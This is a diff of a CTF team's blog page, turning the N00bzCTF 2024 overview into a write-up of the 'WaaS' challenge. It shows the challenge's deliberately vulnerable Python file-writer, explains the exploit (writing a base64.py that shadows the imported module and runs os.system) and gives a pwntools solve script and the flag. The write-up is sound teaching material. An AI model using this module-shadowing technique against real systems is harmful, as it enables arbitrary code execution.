@@ -20,10 +20,8 @@
     <meta charset="utf-8">
     <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>N00bzCTF - ByteTheCookies</title>
+    <title>WaaS - ByteTheCookies</title>
 
-    
-    <meta name="description" content="A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz." />
     
 
     
@@ -33,29 +31,41 @@
     
 
     
-        <meta property="og:url" content="http://localhost:1313/writeups/n00bzctf/">
+        <meta property="og:url" content="http://localhost:1313/writeups/noobzctf/waas/">
   <meta property="og:site_name" content="ByteTheCookies">
-  <meta property="og:title" content="N00bzCTF">
-  <meta property="og:description" content="A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.">
+  <meta property="og:title" content="WaaS">
+  <meta property="og:description" content="Waas Desc: Writing as a Service!
+Authors: NoobMaster &#43; NoobHacker
+Points: 491
+Solve: 78
+Introduction WaaS (Writing as a Service) allows us to overwrite a file on the system (after some input validation) and insert anything (until a newline is met) we want in it.
+import subprocess from base64 import b64decode as d while True: print(&#34;[1] Write to a file\n[2] Get the flag\n[3] Exit&#34;) try: inp = int(input(&#34;Choice: &#34;).strip()) except: print(&#34;Invalid input!">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2024-08-05T18:26:54+02:00">
-    <meta property="article:modified_time" content="2024-08-06T12:01:19+02:00">
-    <meta property="article:tag" content="CTF">
-    <meta property="article:tag" content="N00bz">
+    <meta property="article:published_time" content="2024-08-06T11:27:07+02:00">
+    <meta property="article:modified_time" content="2024-08-06T11:27:07+02:00">
+    <meta property="article:tag" content="Misc">
+    <meta property="article:tag" content="Python">
 
     
 
     
         
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="N00bzCTF">
-  <meta name="twitter:description" content="A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.">
+  <meta name="twitter:title" content="WaaS">
+  <meta name="twitter:description" content="Waas Desc: Writing as a Service!
+Authors: NoobMaster &#43; NoobHacker
+Points: 491
+Solve: 78
+Introduction WaaS (Writing as a Service) allows us to overwrite a file on the system (after some input validation) and insert anything (until a newline is met) we want in it.
+import subprocess from base64 import b64decode as d while True: print(&#34;[1] Write to a file\n[2] Get the flag\n[3] Exit&#34;) try: inp = int(input(&#34;Choice: &#34;).strip()) except: print(&#34;Invalid input!">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
 
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
 
 
 
@@ -82,6 +92,20 @@
 
 
 
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
 
 
 
@@ -288,13 +312,8 @@
         
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#description">Description</a></li>
-    <li><a href="#performance-summary">Performance Summary</a></li>
-    <li><a href="#writeups">Writeups</a>
-      <ul>
-        <li></li>
-      </ul>
-    </li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#solution">Solution</a></li>
   </ul>
 </nav>
         
@@ -313,8 +332,8 @@
         
     
     
-<h1 id="n00bz-ctf-2024" class="header-anchor-wrapper">N00bz CTF 2024
-  <a href="#n00bz-ctf-2024" class="header-anchor-link">
+<h1 id="waas" class="header-anchor-wrapper">Waas
+  <a href="#waas" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -328,9 +347,13 @@
   </a>
 </h1>
 
+<p><strong>Desc</strong>: Writing as a Service!</p>
+<p><strong>Authors</strong>: NoobMaster + NoobHacker</p>
+<p><strong>Points</strong>: 491</p>
+<p><strong>Solve</strong>: 78</p>
 
-<h2 id="description" class="header-anchor-wrapper">Description
-  <a href="#description" class="header-anchor-link">
+<h2 id="introduction" class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -344,10 +367,39 @@
   </a>
 </h2>
 
-<p>A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.</p>
+<p>WaaS (Writing as a Service) allows us to overwrite a file on the system (after some input validation) and insert anything (until a newline is met) we want in it.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import subprocess
+from base64 import b64decode as d
+while True:
+        print(&quot;[1] Write to a file\n[2] Get the flag\n[3] Exit&quot;)
+        try:
+                inp = int(input(&quot;Choice: &quot;).strip())
+        except:
+                print(&quot;Invalid input!&quot;)
+                exit(0)
+        if inp == 1:
+                file = input(&quot;Enter file name: &quot;).strip()
+                assert file.count('.') &lt;= 2 # Why do you need more?
+                assert &quot;/proc&quot; not in file # Why do you need to write there?
+                assert &quot;/bin&quot; not in file # Why do you need to write there? 
+                assert &quot;\n&quot; not in file # Why do you need these?
+                assert &quot;chall&quot; not in file # Don't be overwriting my files!
+                try: 
+                        f = open(file,'w')
+                except:
+                        print(&quot;Error! Maybe the file does not exist?&quot;)
 
-<h2 id="performance-summary" class="header-anchor-wrapper">Performance Summary
-  <a href="#performance-summary" class="header-anchor-link">
+                f.write(input(&quot;Data: &quot;).strip())
+                f.close()
+                print(&quot;Data written sucessfully!&quot;)
+
+        if inp == 2:
+                flag = subprocess.run([&quot;cat&quot;,&quot;fake_flag.txt&quot;],capture_output=True) # You actually thought I would give the flag?
+                print(flag.stdout.strip())
+</code></pre>
+
+<h2 id="solution" class="header-anchor-wrapper">Solution
+  <a href="#solution" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -361,66 +413,38 @@
   </a>
 </h2>
 
-<ul>
-<li><strong>CTFs</strong>: 31/32</li>
-<li><strong>Total point</strong>: 9794.000</li>
-<li><strong>Position</strong>: 24</li>
-<li><strong>Rating points</strong>: 24.067</li>
-</ul>
+<p>At first one may think of trying to bypass the input validation to perhaps rewrite the workings of the cat command or the challenge file itself, but this isn&rsquo;t possible.
+Something very bizarre is the imported but unused <code>b64decode</code> from the <code>base64</code> module, which is what allows us to solve the challenge.
+When python imports modules it looks in <code>sys.path</code>, which has a list of valid directories to import modules from. After a quick scan through the <a href="https://docs.python.org/3/library/sys_path_init.html">python3 docs</a> we find out that the first directory it looks through is the same directory the file is in, this means that if we have a <code>base64.py</code> file in the directory then python will try to import a <code>b64decode</code> symbol from that file instead of the common known module.
+One more feature of python&rsquo;s import behavior we can use is the that all the code in an imported module will be executed. For example if a file <code>test.py</code> has <code>print('Hello, World!')</code> and it can be executed (for example if it&rsquo;s at the lowest indentation level) then a file with <code>import test</code> will indeed see <code>Hello, World!</code> printed to <code>stdout</code>.
+Therefore, since the <code>open</code> function with a <code>'w'</code> flag will create a file if it does not exist, we can simply create a file named <code>base64.py</code> and write our malicious code in it.
+Something like this will do the trick:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import os; b64decode = 0; os.system(&quot;cat flag.txt&quot;)
+</code></pre>
+<p>But the flag isn&rsquo;t our yet; we need to use the fact that the instance does not reset its files every time we connect to it, which means that our <code>base64.py</code> will remain in the directory for the lifetime of the instance. This means we simply need to reconnect to it and get our flag.</p>
+<p><code>solve.py</code></p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">from pwn import *
 
-<h2 id="writeups" class="header-anchor-wrapper">Writeups
-  <a href="#writeups" class="header-anchor-link">
-    <svg width="16px" height="16px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
-</svg>
+def solve():
+  r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance
 
-</svg>
-  </a>
-</h2>
+  r.sendlineafter(b'Choice: ', b'1') # 1 to write a file
+  r.sendlineafter(b'Enter file name: ', b'base64.py')
+  r.sendlineafter(b'Data: ', b'import os; b64decode = 0; os.system(&quot;cat flag.txt&quot;)')
 
+  r.close()
 
-<h4 id="web" class="header-anchor-wrapper">Web
-  <a href="#web" class="header-anchor-link">
-    <svg width="16px" height="16px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
-</svg>
+  r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance
+  flag = r.recvline().decode()
+  print(f'flag: {flag}')
+  r.close()
 
-</svg>
-  </a>
-</h4>
-
-<ul>
-<li><a href="/writeups/noobzctf/filesharingportal/">File Sharing Portal</a></li>
-</ul>
-
-<h4 id="misc" class="header-anchor-wrapper">Misc
-  <a href="#misc" class="header-anchor-link">
-    <svg width="16px" height="16px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
-</svg>
-
-</svg>
-  </a>
-</h4>
-
-<ul>
-<li><a href="/writeups/noobzctf/waas/">Waas</a></li>
-</ul>
+if __name__ == '__main__':
+  solve()
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code>flag: n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_f5c63f47af0e}
+</code></pre>
+<p align="right">Author: vympel</p>
 
 </article>
 </div>
